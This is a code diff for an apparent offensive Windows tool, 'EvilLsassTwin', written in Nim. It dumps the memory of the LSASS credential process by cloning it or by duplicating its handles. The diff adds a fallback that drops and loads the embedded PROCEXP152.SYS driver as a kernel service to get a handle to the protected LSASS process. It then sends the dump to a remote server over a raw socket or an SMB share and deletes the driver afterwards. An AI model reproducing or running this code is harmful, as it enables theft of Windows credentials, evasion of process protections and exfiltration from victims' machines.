@@ -1,19 +1,58 @@
 import winim
 import ptr_math
-import std/[strformat, strutils, dynlib, tables, net]
+import std/[strformat, strutils, dynlib, tables, net, os]
 
 const serverIP = "0.0.0.0"
 const serverPort = 6500
 const smbShare = fmt"\\{serverIP}\Share\EvilTwin.bin"
 
-const useSMB = false
-const useRawSocket = true
+const procExp = staticRead("PROCEXP152.SYS")
+const IOCTL_OPEN_PROTECTED_PROCESS_HANDLE = cast[uint32](0x8335003c)
 
 type
     NtQuerySystemInformation_t = proc(SystemInformationClass: ULONG, SystemInformation: PVOID, SystemInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.stdcall.}
     NtDuplicateObject_t = proc(SourceProcessHandle: HANDLE, SourceHandle: HANDLE, TargetProcessHandle: HANDLE, TargetHandle: PHANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Options: ULONG): NTSTATUS {.stdcall.}
     NtCreateProcessEx_t = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ParentProcess: HANDLE, Flags: ULONG, SectionHandle: HANDLE, DebugPort: HANDLE, ExceptionPort: HANDLE, InJob: BOOLEAN): NTSTATUS {.stdcall.}
     NtGetNextProcess_t = proc(ProcessHandle: HANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Flags: ULONG, NewProcessHandle: PHANDLE): NTSTATUS {.stdcall.}
+
+    exfilMethod = enum
+        useSMB, useRaw
+
+var exfil: exfilMethod = useRaw
+
+var 
+    hSCManager: SC_HANDLE
+    hService: SC_HANDLE
+    hDriver: HANDLE
+    ss: SERVICE_STATUS
+    pid: ULONG
+    isClone: bool = false
+    hPPL: HANDLE = 0
+    bytesReturned: DWORD
+
+proc toString(chars: openArray[WCHAR]): string =
+    result = ""
+    for c in chars:
+        if cast[char](c) == '\0':
+            break
+        result.add(cast[char](c))
+
+proc GetProcessByName(process_name: string): DWORD =
+    var
+        pid: DWORD = 0
+        entry: PROCESSENTRY32
+        hSnapshot: HANDLE
+
+    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+    
+    if Process32First(hSnapshot, addr entry):
+        while Process32Next(hSnapshot, addr entry):
+            if entry.szExeFile.toString == process_name:
+                pid = entry.th32ProcessID
+                break
+    CloseHandle(hSnapshot)
+    return pid
 
 proc isElevatedProcess(): bool =
     var isElevated: bool
@@ -163,9 +202,9 @@ proc enumLsassHandles(): seq[(ULONG, HANDLE)] =
 
 when isMainModule:
     var hNtdll = loadLib("ntdll.dll")
-    #var hComsvcs = loadLib("comsvcs.dll")
     var status: NTSTATUS
     var procOA: OBJECT_ATTRIBUTES
+    var miniDump: WINBOOL
 
     InitializeObjectAttributes(addr procOA, NULL, 0, cast[HANDLE](NULL), NULL)
 
@@ -193,7 +232,6 @@ when isMainModule:
     {.emit: "char procName[4096];".}
     var procName {.importc, nodecl.}: cstring
 
-    var pid: DWORD
     var count: int = 1
 
     if dupHandlesSeq.len == 0:
@@ -213,29 +251,136 @@ when isMainModule:
                 pid = GetProcessId(victimHandle)
                 echo fmt"[+] Found PID {pid} and Obtained Handle {victimHandle} (0x{toHex(victimHandle)})" 
                 break
+            else: CloseHandle(victimHandle)
         
         #discard readLine(stdin)
-        if victimHandle == 0:
-            echo "[-] Error: ", GetLastError(), " | Failed to Obtain Handle to Process!"
-            echo "[!] Quitting!"
-            quit(1)
-        else:
-            dupHandlesSeq.add((pid, victimHandle))
+        if victimHandle == 0 or victimHandle == INVALID_HANDLE_VALUE:
+            echo "[-] Could Not Obtain Handle!\n[!] Attempting to Obtain Handle with Kernel Driver..."
 
-    echo "[!] Cloning Process..."
-    for handleTuple in dupHandlesSeq:
-        status = NtCreateProcessEx(addr victimHandle, PROCESS_ALL_ACCESS, addr procOA, handleTuple[1], cast[ULONG](0), cast[HANDLE](NULL), cast[HANDLE](NULL), cast[HANDLE](NULL), FALSE)
-        if NT_SUCCESS(status):
-            echo "[+] Successfully Cloned to New PID: ", GetProcessId(victimHandle), "\n"
-            break
-        else:
-            echo "[-] Error Cloning Process: ", toHex($status)
+            echo "\n[!] Checking for SE_LOAD_DRIVER privilege..."
+            if OpenProcessToken(cast[HANDLE](-1), TOKEN_ADJUST_PRIVILEGES, addr hToken) != 0 and SetPrivilege(hToken, SE_LOAD_DRIVER_NAME, TRUE):
+                echo "[+] SE_LOAD_DRIVER privilege enabled!"
+                CloseHandle(hToken)
+            else:
+                echo "[-] Failed to Enable SeLoadDriverPrivilege\n[!] Cannot Continue Without It..."
+            
+            echo "\n[!] Finding PID"
+            pid = GetProcessByName("lsass.exe")
+            echo "[!] Found PID: ", pid, " - 0x", toHex($pid)
+
+            if not "EvilLsassTwin.sys".fileExists:
+                try:
+                    var driverFile = open("EvilLsassTwin.sys", fmWrite)
+                    writeFile("EvilLsassTwin.sys", procExp.toOpenArrayByte(0, procExp.high))
+                    driverFile.close()
+                    echo "\n[+] Wrote Driver File to Disk!"
+                except:
+                    echo "\n[-] Could Not Write Driver File to Disk!\n[!] Quitting..."
+                    quit(1)
+
+            hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT or SC_MANAGER_CREATE_SERVICE)
+            
+            if hSCManager == cast[SC_HANDLE](NULL):
+                echo "\n[-] OpenSCManager Failed!\n[!] Quitting..."
+                quit(1)
+            
+            hService = CreateService(hSCManager, "EvilLsassTwinService", NULL, SERVICE_START or DELETE or SERVICE_STOP or SERVICE_QUERY_STATUS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, expandFilename("EvilLsassTwin.sys"), NULL, NULL, NULL, NULL, NULL)
+            if hService != cast[SC_HANDLE](NULL):
+                echo "\n[+] Service Created Successfully!"
+            else:
+                echo "\n[-] CreateService Failed!"
+              
+                hService = OpenService(hSCManager, "EvilLsassTwinService", SERVICE_START or DELETE or SERVICE_STOP or SERVICE_QUERY_STATUS)
+                if hService == cast[SC_HANDLE](NULL):
+                    echo "[-] Could Not Obtain Handle to Service: OpenService Failed!\n[!] Quitting..."
+                    #echo GetLastError()
+                    quit(1)
+            
+            var ssStatus: SERVICE_STATUS_PROCESS
+            var bytesNeeded: DWORD
+            var svcStatusQueryResult = QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, cast[LPBYTE](addr ssStatus), cast[DWORD](sizeof(SERVICE_STATUS_PROCESS)), addr bytesNeeded)
+            
+            if svcStatusQueryResult == 0:
+                echo "[-] Cannot Get Service Status: QueryServiceStatusEx Failed!\n[!] Quitting..."
+                #echo GetLastError()
+                quit(1)
+            
+            case ssStatus.dwCurrentState:
+                of 1:
+                    echo "[!] Service Stopped!\n[!] Starting Service!"
+                    sleep(10000)
+
+                    if StartService(hService, cast[DWORD](0), NULL) == 0:
+                        echo "\n[!] Could Not Start Service: StartService Failed\n[!] Trying again..."
+                        sleep(5000)
+                        StartService(hService, cast[DWORD](0), NULL)
+                    sleep(5000)
+                    svcStatusQueryResult = QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, cast[LPBYTE] (addr ssStatus), cast[DWORD](sizeof(SERVICE_STATUS_PROCESS)), addr bytesNeeded)
+                    
+                    if svcStatusQueryResult == 0:
+                        echo "[-] Could Not Query Service Status: QueryServiceStatusEx Failed!"
+                        #echo GetLastError()
+
+                    if ssStatus.dwCurrentState == 2:
+                        echo "[!] Service Starting!"
+
+                    if ssStatus.dwCurrentState == 4:
+                        echo "[+] Service Running!"
+
+                    if ssStatus.dwCurrentState == 1:
+                        echo "[!] Service Stopped!"
+                of 4:
+                    echo "[+] Service Running!"
+                else:
+                    echo "[!] Unknown Service State..."
+            hDriver = CreateFile("\\\\.\\PROCEXP152", GENERIC_ALL, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](NULL))
+            #echo "[!] Driver Handle: ", hDriver
+        
+            if hDriver == INVALID_HANDLE_VALUE:
+                echo "[-] Handle to Driver Could Not Be Obtained!\n[!] Quitting..."
+                echo GetLastError()
+                ControlService(hService, SERVICE_CONTROL_STOP, addr ss)
+                sleep(10000)
+                DeleteService(hService)
+                sleep(2000)
+                CloseServiceHandle(hService)
+                CloseServiceHandle(hSCManager)
+                if "EvilLsassTwin.sys".tryRemoveFile():
+                    echo "[+] Driver File Removed!"
+                else:
+                    echo "[-] Driver File Could Not Be Removed!"
+                quit(1)
+
+            var ulongPID = cast[ULONGLONG](pid)
+            var dioctlRtn = DeviceIOControl(hDriver, cast[DWORD](IOCTL_OPEN_PROTECTED_PROCESS_HANDLE), addr ulongPID, cast[DWORD](sizeof ulongPID), addr hPPL, cast[DWORD](sizeof HANDLE), addr bytesReturned, NULL)
+            if dioctlRtn == 0:
+                echo "[!] Error Code: ", GetLastError()
             #discard readLine(stdin)
 
-    if NT_SUCCESS(status) == false:
-        echo "[-] Failed to Clone Process. Quitting..."
-        quit(1)
-    #discard readLine(stdin)
+            if hPPL == INVALID_HANDLE_VALUE:
+                echo "\n[-] Did Not Receive Handle to Process From Driver!"
+            else:
+                echo "\n[+] Handle to Process Received From Driver: ", hPPL, " (0x", toHex(hPPL),")\n"
+                #echo "Process ID from Handle: ", GetProcessId(hPPL), " | 0x", toHex(GetProcessId(hPPL))
+                dupHandlesSeq.add((cast[ULONG](pid), hPPL))
+        else:
+            isClone = true
+            dupHandlesSeq.add((pid, victimHandle))
+    if isClone:
+        echo "[!] Cloning Process..."
+        for handleTuple in dupHandlesSeq:
+            status = NtCreateProcessEx(addr victimHandle, PROCESS_ALL_ACCESS, addr procOA, handleTuple[1], cast[ULONG](0), cast[HANDLE](NULL), cast[HANDLE](NULL), cast[HANDLE](NULL), FALSE)
+            if NT_SUCCESS(status):
+                echo "[+] Successfully Cloned to New PID: ", GetProcessId(victimHandle), "\n"
+                break
+            else:
+                echo "[-] Error Cloning Process: ", toHex($status)
+                #discard readLine(stdin)
+
+        if NT_SUCCESS(status) == false:
+            echo "[-] Failed to Clone Process. Quitting..."
+            quit(1)
+        #discard readLine(stdin)
 
     var IoStatusBlock: IO_STATUS_BLOCK
     var fileDI: FILE_DISPOSITION_INFORMATION
@@ -246,8 +391,9 @@ when isMainModule:
 
     if outFile == INVALID_HANDLE_VALUE:
         echo "[-] Dump File Could Not Be Created In Current Directory! Error: ", GetLastError(), "\n[!]Quitting..."
-        TerminateProcess(victimHandle, 0)
-        CloseHandle(victimHandle)
+        if isClone:
+            TerminateProcess(victimHandle, 0)
+            CloseHandle(victimHandle)
         CloseHandle(outFile)
         quit(1)
 
@@ -256,15 +402,20 @@ when isMainModule:
     if NT_SUCCESS(status) == false:
         echo "[-] NtSetInformationFile Failed! Error: ", toHex($status)
         quit(1)
+    if isClone:
+        miniDump = MiniDumpWriteDump(victimHandle, 0, outFile, 0x00000002, NULL, NULL, NULL)
+    else:
+        miniDump = MiniDumpWriteDump(hPPL, 0, outFile, 0x00000002 or 0x00020000, NULL, NULL, NULL)
     
-    var miniDump = MiniDumpWriteDump(victimHandle, 0, outFile, 0x00000002, NULL, NULL, NULL)
     if miniDump == TRUE:
         echo "[+] Sucessfully Dumped Evil Twin!"
-        TerminateProcess(victimHandle, 0)
+        if isClone:
+            TerminateProcess(victimHandle, 0)
         #discard readLine(stdin)
     else: 
         echo fmt"[-] MDWP Failed! Error: {GetLastError()}.\n[!] Quitting..."
-        TerminateProcess(victimHandle, 0)
+        if isClone:
+            TerminateProcess(victimHandle, 0)
         CloseHandle(outFile)
     
     if miniDump == FALSE:
@@ -276,7 +427,7 @@ when isMainModule:
     var mappedData = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0)
     echo "\n[!] Mapped Data at: 0x", repr mappedData, " - Size: ", size
     
-    if useRawSocket:
+    if exfil == useRaw:
         var dataPointer = mappedData
         #var dumpSeq: seq[byte] = @[]
 
@@ -305,7 +456,7 @@ when isMainModule:
         
         socket.close()
     
-    if useSMB:
+    else:
         # SMB Data Exfiltration
         var dwBytesWritten: DWORD
 
@@ -334,5 +485,16 @@ when isMainModule:
     #discard readLine(stdin)
     CloseHandle(outFile)
     CloseHandle(hMapping)
-
+    
+    CloseHandle(hDriver)
+    ControlService(hService, SERVICE_CONTROL_STOP, addr ss)
+    sleep(10000)
+    DeleteService(hService)
+    sleep(2000)
+    CloseServiceHandle(hService)
+    CloseServiceHandle(hSCManager)
+    if "EvilLsassTwin.sys".tryRemoveFile():
+            echo "[+] Driver File Removed!\n"
+    else:
+            echo "[-] Driver File Could Not Be Removed!\n"
     echo "[!] Done!"
